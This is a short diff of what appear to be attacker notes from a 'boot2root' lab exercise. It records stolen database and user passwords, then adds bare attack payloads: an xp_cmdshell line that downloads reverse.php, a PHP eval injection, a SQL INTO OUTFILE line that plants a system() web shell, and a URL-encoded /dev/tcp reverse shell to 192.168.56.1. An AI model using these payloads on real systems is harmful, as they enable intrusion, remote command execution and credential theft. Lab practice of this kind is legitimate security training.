@@ -1,4 +1,4 @@
-pseudo :lmezard -->log 
+lmezard -->log 
 
 !q\]Ej?*5K5cy*AJ --> pass log 
 
@@ -10,3 +10,15 @@ Hey Laurie,
 You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$ --> on email
 
 Best regards.
+
+EXEC xp_cmdshell 'curl -O http://192.168.56.1/Documents/boot2root/reverse.php';
+
+
+
+<?php eval("echo ".$_GET["user"].";"); ?>
+
+SELECT '<?php system($_GET["user"]); ?>' INTO OUTFILE "/var/www/forum/templates_c/yo.php"
+
+sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.56.1%2F9999%200%3E%261
+
+lmezard:G!@M6f4Eatau{sF" --> password LOOKATME
